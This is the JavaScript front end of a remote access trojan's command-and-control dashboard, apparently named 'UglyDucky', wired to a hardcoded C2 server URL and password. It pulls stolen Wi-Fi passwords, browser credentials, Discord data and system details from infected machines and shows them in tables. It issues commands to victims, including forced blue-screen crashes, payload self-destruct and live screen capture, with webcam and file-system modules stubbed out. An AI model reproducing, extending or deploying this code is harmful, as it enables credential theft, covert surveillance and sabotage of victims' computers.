// File: app.js
// ==================================================================
// --- CONFIGURATION ---
// ==================================================================
const C2_LISTENER_URL = "https://uglyducky-c2.onrender.com"; 

// --- NEW SECURITY MEASURE ---
// This must exactly match the DASHBOARD_PASSWORD in c2_listener.py
const DASHBOARD_PASSWORD = "ducky_admin_2024"; 
// ==================================================================

// --- GLOBAL STATE ---
let activeNodeId = null; 
let globalData = [];
let allNodes = []; 
let screenInterval = null;

// ==========================================
// INITIALIZATION
// ==========================================
document.addEventListener("DOMContentLoaded", () => {
    switchTab('extraction'); 
    initDragAndDrop();
    initResizers();
    renderNodesList(); 
    renderMap();
});

// ==========================================
// AUTHENTICATION & FETCHING
// ==========================================
document.getElementById("deviceId").addEventListener("keypress", function(e) {
    if (e.key === "Enter") { e.preventDefault(); fetchData(); }
});

async function fetchData() {
    const deviceId = document.getElementById('deviceId').value.trim();
    if (!deviceId) return showToast("Target Identifier missing.", "error");

    const statusMsg = document.getElementById('statusMsg');
    const btn = document.getElementById('connectBtn');
    
    // Reset UI state
    allNodes = [];
    globalData = [];
    activeNodeId = null;
    document.getElementById('output').innerHTML = "";
    document.getElementById('filterContainer').classList.add('hidden');
    document.getElementById('exportBtn').classList.add('hidden');
    renderNodesList();
    renderMap();

    statusMsg.classList.remove('hidden');
    statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue mr-2"></i>Authenticating & fetching node data...';
    btn.disabled = true;
    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Working';

    try {
        // --- STEP 1: Fetch Node Profile (NOW WITH SECURE HEADER) ---
        const nodeResponse = await fetch(`${C2_LISTENER_URL}/node/${deviceId}`, {
            headers: { "X-Dashboard-Password": DASHBOARD_PASSWORD }
        });
        if (nodeResponse.status === 401) throw new Error("Unauthorized: Password mismatch.");
        if (nodeResponse.status === 404) throw new Error(`Device ID '${deviceId}' not found.`);
        if (!nodeResponse.ok) throw new Error("API Error fetching node details.");
        
        const nodeData = await nodeResponse.json();
        
        // --- STEP 2: Update UI ---
        activeNodeId = nodeData.id;
        allNodes = [nodeData]; 
        renderNodesList();
        renderMap();
        selectNode(activeNodeId); 

        // --- STEP 3: Fetch Vault Logs (NOW WITH SECURE HEADER) ---
        statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue mr-2"></i>Node found. Decrypting vault logs...';
        const logsResponse = await fetch(`${C2_LISTENER_URL}/logs/${deviceId}`, {
            headers: { "X-Dashboard-Password": DASHBOARD_PASSWORD }
        });
        if (!logsResponse.ok) throw new Error("API Error fetching vault logs.");
        
        const logsData = await logsResponse.json();
        globalData = logsData;

        if (globalData.length === 0) {
            statusMsg.innerHTML = `<i class="fa-solid fa-triangle-exclamation text-yellow-500 mr-2"></i>Node found, but no vault logs available.`;
            showToast("Node is active but has no vault data.", "error");
        } else {
            statusMsg.innerHTML = `<i class="fa-solid fa-lock-open text-green-500 mr-2"></i>Vault Decrypted. [${globalData.length} records]`;
            document.getElementById('exportBtn').classList.remove('hidden');
            buildFilters();
            renderCards(globalData, document.getElementById('output'));
            showToast("Authentication successful! Data loaded.", "success");
            
            setTimeout(() => switchTab('rat'), 1000); 
        }

    } catch (error) {
        statusMsg.innerHTML = `<i class="fa-solid fa-triangle-exclamation text-red-500 mr-2"></i>Error: ${error.message}`;
        showToast(error.message, "error");
    } finally {
        btn.disabled = false;
        btn.innerHTML = '<i class="fa-solid fa-unlock-keyhole mr-2"></i> Decrypt';
    }
}

// ==========================================
// C2 COMMAND FUNCTIONS
// ==========================================
async function sendCommandToNode(deviceId, command) {
    if (!deviceId) return showToast("No active node selected!", "error");
    
    termLog(`Sending command '${command}' to ${deviceId}...`);
    try {
        const response = await fetch(`${C2_LISTENER_URL}/issue`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Dashboard-Password': DASHBOARD_PASSWORD // SECURE HEADER
            },
            body: JSON.stringify({ device_id: deviceId, command: command })
        });
        if (response.ok) {
            showToast(`Command '${command}' queued for ${deviceId}`, "success");
        } else {
            throw new Error(`Server responded with ${response.status}`);
        }
    } catch (error) {
        showToast(`Failed to send command.`, "error");
        termLog(`[ERROR] Failed to send command: ${error.message}`);
    }
}

window.triggerScorchedEarth = function() {
    if (!activeNodeId) return showToast("No active node.", "error");
    const confirmation = prompt(`WARNING: SCORCHED EARTH PROTOCOL.\nThis will permanently remove the payload from ${activeNodeId}.\n\nType 'BURN' to confirm.`);
    if (confirmation === "BURN") { sendCommandToNode(activeNodeId, "SELF_DESTRUCT"); } 
    else { showToast("Self-destruct aborted.", "error"); }
};

window.triggerBSOD = function() {
    if (!activeNodeId) return showToast("No active node.", "error");
    if (confirm(`This will force a Blue Screen of Death (BSOD) on ${activeNodeId}. The target system will immediately crash.\n\nAre you sure?`)) {
        sendCommandToNode(activeNodeId, "BSOD");
    } else { showToast("BSOD command aborted.", "error"); }
};

// ==========================================
// UI & TAB LOGIC
// ==========================================
window.switchTab = function(tabId) {
    document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
    document.getElementById('tab-extraction').className = "px-6 py-1.5 rounded-md font-semibold text-sm transition-all text-gray-400 hover:text-white hover:bg-white/5";
    document.getElementById('tab-rat').className = "px-6 py-1.5 rounded-md font-semibold text-sm transition-all text-gray-400 hover:text-white hover:bg-white/5";
    document.getElementById('view-' + tabId).classList.add('active');
    const activeColor = tabId === 'extraction' ? 'bg-cyberBlue text-dark shadow-[0_0_15px_rgba(0,210,211,0.3)]' : 'bg-neon text-white shadow-[0_0_15px_rgba(255,71,87,0.3)]';
    document.getElementById('tab-' + tabId).className = `px-6 py-1.5 rounded-md font-bold text-sm transition-all ${activeColor}`;
};

window.showToast = function(msg, type="success") {
    const toast = document.getElementById('toast');
    const icon = document.getElementById('toastIcon');
    document.getElementById('toastMsg').innerText = msg;
    
    toast.classList.replace(type === "error" ? 'border-neon' : 'border-red-500', type === "error" ? 'border-red-500' : 'border-neon');
    icon.className = type === "error" ? "fa-solid fa-triangle-exclamation text-red-500" : "fa-solid fa-circle-check text-neon";
    
    toast.classList.replace('translate-y-24', 'translate-y-0');
    toast.classList.replace('opacity-0', 'opacity-100');
    setTimeout(() => {
        toast.classList.replace('translate-y-0', 'translate-y-24');
        toast.classList.replace('opacity-100', 'opacity-0');
    }, 3000);
};

// ==========================================
// TILING WINDOW MANAGER
// ==========================================
let draggedPanel = null;
function initDragAndDrop() {
    document.querySelectorAll('.draggable-header').forEach(header => {
        const newHeader = header.cloneNode(true);
        header.parentNode.replaceChild(newHeader, header);
    });
    document.querySelectorAll('.drag-slot').forEach(slot => {
        const newSlot = slot.cloneNode(true);
        slot.parentNode.replaceChild(newSlot, slot);
    });

    document.querySelectorAll('.draggable-header').forEach(header => {
        header.addEventListener('dragstart', (e) => {
            if (e.target.tagName === 'BUTTON' || e.target.closest('button') || header.parentElement.classList.contains('maximized')) { e.preventDefault(); return; }
            draggedPanel = header.closest('.drag-panel');
            e.dataTransfer.effectAllowed = 'move';
            e.dataTransfer.setData('text/plain', '');
            setTimeout(() => draggedPanel.classList.add('dragging'), 0);
        });
        header.addEventListener('dragend', () => {
            if(draggedPanel) draggedPanel.classList.remove('dragging');
            draggedPanel = null;
            document.querySelectorAll('.drag-slot').forEach(s => s.classList.remove('drag-over'));
        });
    });

    document.querySelectorAll('.drag-slot').forEach(slot => {
        slot.addEventListener('dragover', (e) => {
            e.preventDefault(); 
            if(draggedPanel && slot !== draggedPanel.parentElement) slot.classList.add('drag-over');
        });
        slot.addEventListener('dragleave', () => slot.classList.remove('drag-over'));
        slot.addEventListener('drop', (e) => {
            e.preventDefault();
            slot.classList.remove('drag-over');
            if (draggedPanel) {
                const targetPanel = slot.querySelector('.drag-panel');
                const sourceSlot = draggedPanel.parentElement;
                if (targetPanel && sourceSlot !== slot) {
                    sourceSlot.appendChild(targetPanel);
                    slot.appendChild(draggedPanel);
                } else if (!targetPanel && sourceSlot !== slot) {
                    slot.appendChild(draggedPanel); 
                }
            }
        });
    });
}

function initResizers() {
    setupResizer('rz-v1', 'col-left', 'col-mid', true);
    setupResizer('rz-v2', 'col-mid', 'col-right', true);
    setupResizer('rz-h1', 'slot-2', 'slot-3', false);
}

function setupResizer(resizerId, prevId, nextId, isVertical) {
    const resizer = document.getElementById(resizerId);
    if(!resizer) return; 
    const prev = document.getElementById(prevId);
    const next = document.getElementById(nextId);
    
    resizer.addEventListener('mousedown', (e) => {
        e.preventDefault(); resizer.classList.add('active');
        prev.style.transition = 'none'; next.style.transition = 'none';

        const startPos = isVertical ? e.clientX : e.clientY;
        const parentSize = isVertical ? resizer.parentElement.offsetWidth : resizer.parentElement.offsetHeight;
        const prevStartBasis = (prev[isVertical ? 'offsetWidth' : 'offsetHeight'] / parentSize) * 100;
        const nextStartBasis = (next[isVertical ? 'offsetWidth' : 'offsetHeight'] / parentSize) * 100;

        const onMouseMove = (moveEvent) => {
            const delta = isVertical ? moveEvent.clientX - startPos : moveEvent.clientY - startPos;
            const deltaPercent = (delta / parentSize) * 100;
            let newPrev = prevStartBasis + deltaPercent; let newNext = nextStartBasis - deltaPercent;
            if (newPrev > 15 && newNext > 15) {
                prev.style.flexBasis = `${newPrev}%`;
                next.style.flexBasis = `${newNext}%`;
            }
        };

        const onMouseUp = () => {
            resizer.classList.remove('active');
            prev.style.transition = ''; next.style.transition = '';
            document.removeEventListener('mousemove', onMouseMove);
            document.removeEventListener('mouseup', onMouseUp);
        };
        document.addEventListener('mousemove', onMouseMove);
        document.addEventListener('mouseup', onMouseUp);
    });
}

window.toggleMinimize = function(btn, panelId) {
    const buttonEl = btn.tagName === 'I' ? btn.parentElement : btn;
    const panel = document.getElementById(panelId);
    if(!panel || panel.classList.contains('maximized')) return;

    if (panel.dataset.minimized === 'true') {
        panel.dataset.minimized = 'false';
        buttonEl.innerHTML = '<i class="fa-solid fa-minus"></i>';
        panel.classList.remove('collapsed');
    } else {
        panel.dataset.minimized = 'true';
        buttonEl.innerHTML = '<i class="fa-solid fa-window-restore"></i>';
        panel.classList.add('collapsed');
    }
};

window.toggleMaximize = function(btn, panelId) {
    const buttonEl = btn.tagName === 'I' ? btn.parentElement : btn;
    const panel = document.getElementById(panelId);
    if(!panel) return;
    
    if (panel.classList.contains('maximized')) {
        panel.classList.remove('maximized');
        buttonEl.innerHTML = '<i class="fa-solid fa-expand"></i>';
    } else {
        if(panel.dataset.minimized === 'true') toggleMinimize(panel.querySelector('.fa-window-restore').parentElement, panelId);
        panel.classList.add('maximized');
        buttonEl.innerHTML = '<i class="fa-solid fa-compress"></i>';
    }
};

window.resetLayout = function() {
    document.getElementById('col-left').style.flexBasis = '25%';
    document.getElementById('col-mid').style.flexBasis = '50%';
    document.getElementById('col-right').style.flexBasis = '25%';
    document.getElementById('slot-2').style.flexBasis = '50%';
    document.getElementById('slot-3').style.flexBasis = '50%';
    
    document.querySelectorAll('.drag-panel').forEach(p => { p.classList.remove('maximized', 'collapsed'); p.dataset.minimized = 'false'; });
    document.querySelectorAll('.draggable-header button .fa-window-restore').forEach(i => i.className = "fa-solid fa-minus");
    document.querySelectorAll('.draggable-header button .fa-compress').forEach(i => i.className = "fa-solid fa-expand");
    showToast('Layout Reset', 'success');
};

// ==========================================
// RENDER & SELECTION LOGIC
// ==========================================
function renderNodesList() {
    const container = document.getElementById('nodes-list');
    if(!container) return;
    container.innerHTML = '';
    
    if (allNodes.length === 0) {
        container.innerHTML = `<p class="text-gray-500 p-4 text-xs font-mono">Authenticate with a Target ID to begin.</p>`;
        return;
    }

    allNodes.forEach(node => {
        let dotColor = node.status === 'green' ? 'bg-green-500' : (node.status === 'red' ? 'bg-red-500' : 'bg-yellow-500');
        let activeBorder = 'border border-neon bg-neon/5'; 
        let activeLine = '<div class="absolute left-0 top-0 bottom-0 w-1 bg-neon"></div>';
        let pulse = node.status === 'green' ? 'animate-pulse' : '';

        let osLower = (node.os || "").toLowerCase();
        let osIconClass = 'fa-brands fa-windows text-cyberBlue'; 
        
        if (osLower.includes('win')) {
            osIconClass = 'fa-brands fa-windows text-cyberBlue';
        } else if (osLower.includes('mac') || osLower.includes('darwin')) {
            osIconClass = 'fa-brands fa-apple text-gray-300';
        } else if (osLower.includes('linux') || osLower.includes('ubuntu')) {
            osIconClass = 'fa-brands fa-linux text-yellow-400';
        } else if (osLower.length > 0) {
            osIconClass = 'fa-solid fa-desktop text-gray-400';
        }

        container.innerHTML += `
            <div class="p-3 ${activeBorder} rounded-lg relative overflow-hidden group transition-all">
                ${activeLine}
                <div class="flex justify-between items-start mb-2 pl-2">
                    <div class="flex items-center gap-2">
                        <i class="${osIconClass} text-lg"></i>
                        <div><p class="text-sm font-bold text-white truncate max-w-[120px]">${node.id}</p><p class="text-[10px] text-gray-400 font-mono">${node.ip}</p></div>
                    </div>
                    <span class="w-2.5 h-2.5 rounded-full ${dotColor} ${pulse} shadow-[0_0_8px_currentColor]"></span>
                </div>
                <p class="text-[10px] text-gray-500 mt-1 pl-2 truncate" title="${node.os}">${node.os}</p>
            </div>`;
    });
}

function renderMap() {
    const mapDots = document.getElementById('map-dots');
    if(!mapDots) return;
    mapDots.innerHTML = '';
    
    allNodes.forEach(node => {
        const x = (node.lng + 180) / 3.6;
        const y = (90 - node.lat) / 1.8;
        
        let dotColor = node.status === 'green' ? 'text-green-500' : (node.status === 'red' ? 'text-red-500' : 'text-yellow-500');
        mapDots.innerHTML += `
            <div class="map-dot ${dotColor}" style="left: ${x}%; top: ${y}%;">
                <div class="map-tooltip text-[10px] text-left">
                    <div class="font-bold text-white border-b border-gray-700 pb-1 mb-1">${node.id}</div>
                    <div class="text-gray-400">IP: <span class="text-cyberBlue">${node.ip}</span></div>
                    <div class="text-gray-400">OS: <span class="text-white">${node.os}</span></div>
                    <div class="text-gray-400">STAT: <span class="${dotColor}">${node.status.toUpperCase()}</span></div>
                </div>
            </div>`;
    });
}

window.selectNode = function(nodeId) {
    termLog(`Session established. Authenticated as: ${nodeId}`);
    document.getElementById('terminal-connection-msg').innerText = `Connected to ${nodeId} via reverse TCP proxy`;
    document.getElementById('fs-active-node').innerText = nodeId;
};

// ==========================================
// TERMINAL LOGIC
// ==========================================
window.termLog = function(msg) {
    const term = document.getElementById('terminal-output');
    if(!term) return;
    term.innerHTML = term.innerHTML.replace('<span class="cursor-blink"></span>', '');
    const line = document.createElement('div'); line.className = "text-gray-300 mt-1"; line.innerText = `[*] ${msg}`;
    term.appendChild(line);
    const prompt = document.createElement('div'); prompt.className = "mt-2 text-green-400"; prompt.innerHTML = `C:\\Users\\System> <span class="cursor-blink"></span>`;
    term.appendChild(prompt);
    term.scrollTop = term.scrollHeight;
};

window.executeTermCommand = function(inputEl) {
    const val = inputEl.value.trim();
    if(!val) return;
    const term = document.getElementById('terminal-output');
    term.innerHTML = term.innerHTML.replace('<span class="cursor-blink"></span>', val);
    
    setTimeout(() => {
        if(val.toLowerCase() === 'clear') { 
            term.innerHTML = `<div class="text-green-400">C:\\Users\\System> <span class="cursor-blink"></span></div>`; 
            inputEl.value = ''; 
            return; 
        }
        
        if(val.toUpperCase() === 'BSOD' || val.toUpperCase() === 'BURN') {
            termLog(`Forwarding command to C2 server...`);
            if (val.toUpperCase() === 'BURN') {
                sendCommandToNode(activeNodeId, "SELF_DESTRUCT");
            } else {
                sendCommandToNode(activeNodeId, "BSOD");
            }
        } else {
            termLog(`'${val}' queued. (Note: standard terminal emulation in development)`);
        }
    }, 200);
    inputEl.value = '';
};

// ==========================================
// LIVE CONTROL MODALS (Screen, Cam, etc.)
// ==========================================
window.openScreenViewer = function() {
    if (!activeNodeId) return showToast("Must authenticate to node first.", "error");
    const modal = document.getElementById('screenViewerModal');
    document.getElementById('sv-active-node').innerText = activeNodeId;
    modal.classList.remove('hidden');
    setTimeout(() => modal.classList.add('visible'), 10);
    termLog("Screen viewer initialized. Ready to start feed.");
    // Reset state on open
    document.getElementById('screenViewerImage').classList.add('hidden');
    document.getElementById('screenViewerImage').src = '';
    document.getElementById('sv-placeholder').classList.remove('hidden');
    document.getElementById('sv-status').innerText = 'STATUS: IDLE';
    document.getElementById('sv-status').className = 'text-xs font-mono text-gray-500 ml-4';
};

window.closeScreenViewer = function() {
    stopScreenFeed(); // Ensure feed is stopped on close
    const modal = document.getElementById('screenViewerModal');
    modal.classList.remove('visible');
    setTimeout(() => modal.classList.add('hidden'), 300);
};

window.startScreenFeed = function() {
    if (!activeNodeId) return;
    if (screenInterval) clearInterval(screenInterval); // Clear any existing interval

    const monitorIndex = document.getElementById('sv-monitor-select').value;
    const command = `START_SCREENSHARE_${monitorIndex}`;
    
    sendCommandToNode(activeNodeId, command);
    
    screenInterval = setInterval(fetchScreenFrame, 1500); // Poll every 1.5s for a new frame
    
    const statusEl = document.getElementById('sv-status');
    statusEl.innerText = 'STATUS: CONNECTING...';
    statusEl.className = 'text-xs font-mono text-yellow-500 ml-4 animate-pulse';
    showToast(`Starting screen feed for Monitor ${parseInt(monitorIndex) + 1}...`, "success");
    termLog(`Command sent: ${command}`);
};

window.stopScreenFeed = function() {
    if (screenInterval) {
        clearInterval(screenInterval);
        screenInterval = null;
    }
    if (activeNodeId) {
        sendCommandToNode(activeNodeId, 'STOP_SCREENSHARE');
    }
    const statusEl = document.getElementById('sv-status');
    statusEl.innerText = 'STATUS: STOPPED';
    statusEl.className = 'text-xs font-mono text-red-500 ml-4';
    termLog('Screen feed stopped.');
};

async function fetchScreenFrame() {
    if (!activeNodeId) {
        stopScreenFeed();
        return;
    }
    try {
        const response = await fetch(`${C2_LISTENER_URL}/screen/${activeNodeId}`, {
            headers: { 'X-Dashboard-Password': DASHBOARD_PASSWORD }
        });
        if (!response.ok) throw new Error(`Server error: ${response.status}`);
        
        const data = await response.json();
        const imgEl = document.getElementById('screenViewerImage');
        const placeholderEl = document.getElementById('sv-placeholder');
        const statusEl = document.getElementById('sv-status');

        if (data.frame) {
            imgEl.src = `data:image/jpeg;base64,${data.frame}`;
            imgEl.classList.remove('hidden');
            placeholderEl.classList.add('hidden');
            statusEl.innerText = 'STATUS: LIVE';
            statusEl.className = 'text-xs font-mono text-green-500 ml-4 animate-pulse';
        } else if (statusEl.innerText.includes('LIVE')) {
            statusEl.innerText = 'STATUS: INTERRUPTED';
            statusEl.className = 'text-xs font-mono text-yellow-500 ml-4';
        }
    } catch (error) {
        console.error("Error fetching screen frame:", error);
        stopScreenFeed();
        showToast("Screen feed failed or was interrupted.", "error");
        const statusEl = document.getElementById('sv-status');
        statusEl.innerText = 'STATUS: FAILED';
        statusEl.className = 'text-xs font-mono text-red-500 ml-4';
    }
}

window.openCamViewer = function() {
    if (!activeNodeId) return showToast("Must authenticate to node first.", "error");
    showToast("Live Cam module not yet implemented.", "error");
    termLog("Live Cam module is in development. Awaiting payload integration.");
};

// ==========================================
// FILE EXPLORER
// ==========================================
window.openFileSystem = function() {
    if(!activeNodeId) return showToast("Must authenticate to node first.", "error");
    const modal = document.getElementById('fileExplorerModal');
    modal.classList.remove('hidden');
    setTimeout(() => modal.classList.add('visible'), 10);
    
    const tbody = document.getElementById('fsTbody');
    tbody.innerHTML = `
        <tr class="border-b border-gray-800/60 hover:bg-neon/10 transition-colors">
            <td class="p-3 text-center"><i class="fa-solid fa-triangle-exclamation text-yellow-500"></i></td>
            <td class="p-3 font-bold text-gray-300">File System Offline</td>
            <td class="p-3 text-right text-gray-400"></td>
            <td class="p-3 text-right text-gray-500 text-xs"></td>
            <td class="p-3 text-center"></td>
        </tr>
    `;
    termLog("File Explorer initialized. Awaiting directory listing capability.");
};

window.closeFileSystem = function() {
    const modal = document.getElementById('fileExplorerModal');
    modal.classList.remove('visible');
    setTimeout(() => modal.classList.add('hidden'), 300);
};
window.navigateUp = function() { showToast('Awaiting live target connection.'); };
window.triggerUpload = function() { document.getElementById('fileUploadInput').click(); };
document.getElementById('fileUploadInput').onchange = function(e) { if(e.target.files[0]) showToast(`Upload queued: ${e.target.files[0].name}`); };

// ==========================================
// VAULT CARD RENDERING
// ==========================================
function buildFilters() {
    const container = document.getElementById('filterContainer');
    container.innerHTML = '';
    container.classList.remove('hidden');

    const categories = [...new Set(globalData.map(item => item.category))];
    container.appendChild(createFilterBtn('All', true));
    categories.forEach(cat => container.appendChild(createFilterBtn(cat, false)));
}

function createFilterBtn(text, isActive) {
    const btn = document.createElement('button');
    const activeClasses = 'bg-cyberBlue/20 text-cyberBlue font-bold border-cyberBlue shadow-[0_0_10px_rgba(0,210,211,0.2)]';
    const inactiveClasses = 'bg-[#0f1423] text-gray-400 border-gray-700 hover:text-white hover:border-gray-500';
    btn.className = `px-5 py-2 rounded border text-xs font-mono transition-all duration-200 filter-btn ${isActive ? activeClasses : inactiveClasses}`;
    btn.innerText = text;
    
    btn.onclick = () => {
        document.querySelectorAll('.filter-btn').forEach(b => b.className = `px-5 py-2 rounded border text-xs font-mono transition-all duration-200 filter-btn ${inactiveClasses}`);
        btn.className = `px-5 py-2 rounded border text-xs font-mono transition-all duration-200 filter-btn ${activeClasses}`;
        renderCards(text === 'All' ? globalData : globalData.filter(item => item.category === text), document.getElementById('output'));
    };
    return btn;
}

function renderCards(data, outputDiv) {
    outputDiv.innerHTML = '';
    data.forEach((item, index) => {
        let icon = 'fa-file-code'; let color = 'text-neon';
        if(item.category.includes('Wi-Fi')) { icon = 'fa-wifi'; color = 'text-blue-400'; }
        if(item.category.includes('System')) { icon = 'fa-server'; color = 'text-green-400'; }
        if(item.category.includes('Password') || item.category.includes('Cred')) { icon = 'fa-key'; color = 'text-yellow-400'; }
        if(item.category.includes('Discord')) { icon = 'fa-discord'; color = 'text-indigo-400'; }

        const panelId = `vault-panel-${index}`;
        const htmlContent = parseToHTML(item.category, item.content);
        
        const slot = document.createElement('div');
        slot.className = "drag-slot fade-in h-[400px]"; 
        slot.style.animationDelay = `${index * 0.05}s`;
        
        slot.innerHTML = `
            <div id="${panelId}" class="drag-panel" data-minimized="false">
                <div class="draggable-header px-4 py-3 border-b border-gray-800 flex justify-between items-center bg-[#050810] rounded-t-[0.75rem]" draggable="true">
                    <div class="flex items-center gap-2 pointer-events-none">
                        <i class="fa-solid ${icon} ${color}"></i>
                        <h3 class="font-bold text-gray-200 text-xs uppercase tracking-widest">${item.category}</h3>
                    </div>
                    <div class="flex gap-2">
                        <button onclick="toggleMinimize(this, '${panelId}')" class="w-4 h-4 rounded-full bg-yellow-500/20 text-yellow-500 hover:bg-yellow-500 hover:text-white flex items-center justify-center text-[8px]"><i class="fa-solid fa-minus"></i></button>
                        <button onclick="toggleMaximize(this, '${panelId}')" class="w-4 h-4 rounded-full bg-green-500/20 text-green-500 hover:bg-green-500 hover:text-white flex items-center justify-center text-[8px]"><i class="fa-solid fa-expand"></i></button>
                    </div>
                </div>
                <div class="win-content flex flex-col bg-[#0f1423] rounded-b-[0.75rem] h-full relative">
                    <div class="absolute top-2 right-2 z-10 flex gap-2">
                        <span class="text-[10px] font-mono text-gray-500 bg-black/60 px-2 py-1 rounded">${new Date(item.created_at).toLocaleDateString()}</span>
                        <button onclick="copyData(this)" class="bg-gray-800 hover:bg-gray-700 text-white rounded px-2 py-1 transition-colors text-[10px]" title="Copy Raw"><i class="fa-regular fa-copy"></i></button>
                    </div>
                    <div class="p-0 flex-grow overflow-y-auto mt-6">
                        <textarea class="hidden-raw-data hidden">${item.content}</textarea>
                        ${htmlContent}
                    </div>
                </div>
            </div>
        `;
        outputDiv.appendChild(slot);
    });
    initDragAndDrop(); 
}

function parseToHTML(category, content) {
    let defaultRaw = `<pre class="p-4 font-mono text-xs text-cyberBlue whitespace-pre-wrap break-all">${escapeHtml(content)}</pre>`;
    try {
        if (category.includes('Wi-Fi')) {
            const blocks = content.split(/-{10,}/).filter(b => b.trim().length > 0);
            let rows = blocks.map(block => {
                let ssid = (block.match(/SSID:\s*(.*)/i) || [])[1] || 'Unknown';
                let pass = (block.match(/PASS:\s*(.*)/i) || [])[1] || 'N/A';
                return `<tr class="border-b border-gray-800/50 hover:bg-white/5"><td class="px-4 py-2.5 text-blue-400 font-bold w-1/2 break-all">${escapeHtml(ssid)}</td><td class="px-4 py-2.5 font-mono text-white blur-reveal rounded w-1/2 break-all">${escapeHtml(pass)}</td></tr>`;
            }).join('');
            return rows ? `<table class="w-full text-left text-xs table-fixed"><thead class="bg-[#050810] text-gray-500"><tr><th class="p-2 pl-4 w-1/2">Network (SSID)</th><th class="p-2 w-1/2">Password</th></tr></thead><tbody>${rows}</tbody></table>` : defaultRaw;
        }
        if (category.includes('Password') || category.includes('Cred')) {
            const blocks = content.split(/-{10,}/).filter(b => b.trim().length > 0);
            let rows = blocks.map(block => {
                let url = (block.match(/(?:URL|HOST):\s*(.*)/i) || [])[1] || 'N/A';
                let user = (block.match(/USER:\s*(.*)/i) || [])[1] || 'N/A';
                let pass = (block.match(/PASS:\s*(.*)/i) || [])[1] || 'N/A';
                return `<tr class="border-b border-gray-800/50 hover:bg-white/5"><td class="p-2 pl-3 text-yellow-400 truncate w-1/3" title="${escapeHtml(url)}">${escapeHtml(url)}</td><td class="p-2 text-gray-300 truncate w-1/3">${escapeHtml(user)}</td><td class="p-2 font-mono text-white blur-reveal rounded w-1/3 truncate">${escapeHtml(pass)}</td></tr>`;
            }).join('');
            return rows ? `<table class="w-full text-left text-xs table-fixed"><thead class="bg-[#050810] text-gray-500"><tr><th class="p-2 pl-3 w-1/3">Target</th><th class="p-2 w-1/3">User</th><th class="p-2 w-1/3">Pass</th></tr></thead><tbody>${rows}</tbody></table>` : defaultRaw;
        }
        if (category.includes('System')) {
            const lines = content.split('\n').filter(l => l.trim().length > 0);
            let gridItems = lines.map(line => {
                let parts = line.includes(':') ? line.split(':') : line.split('=');
                if (parts.length >= 2) {
                    let key = parts.shift().trim(); let val = parts.join(':').trim();
                    return `<div class="bg-[#050810] p-2.5 rounded border border-gray-800/80"><div class="text-gray-500 text-[9px] font-bold uppercase tracking-wider mb-0.5">${escapeHtml(key)}</div><div class="text-green-400 font-mono text-[11px] truncate">${escapeHtml(val)}</div></div>`;
                } return '';
            }).join('');
            if (gridItems) return `<div class="p-3 grid grid-cols-2 gap-2">${gridItems}</div>`;
        }
    } catch (e) { return defaultRaw; }
    return defaultRaw;
}

function escapeHtml(unsafe) { return unsafe.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;"); }

window.copyData = function(btnElement) {
    const dataToCopy = btnElement.closest('.drag-panel').querySelector('.hidden-raw-data').value;
    navigator.clipboard.writeText(dataToCopy).then(() => {
        showToast("Raw payload copied to clipboard");
        const icon = btnElement.querySelector('i');
        icon.className = "fa-solid fa-check text-green-400";
        setTimeout(() => icon.className = "fa-regular fa-copy", 2000);
    });
};

window.exportLogs = function() {
    if (globalData.length === 0) return showToast("No data to export.", "error");
    const deviceId = document.getElementById('deviceId').value.trim() || 'export';
    const jsonData = JSON.stringify(globalData, null, 2);
    const blob = new Blob([jsonData], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `ducky_logs_${deviceId}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    showToast("Logs exported.");
};
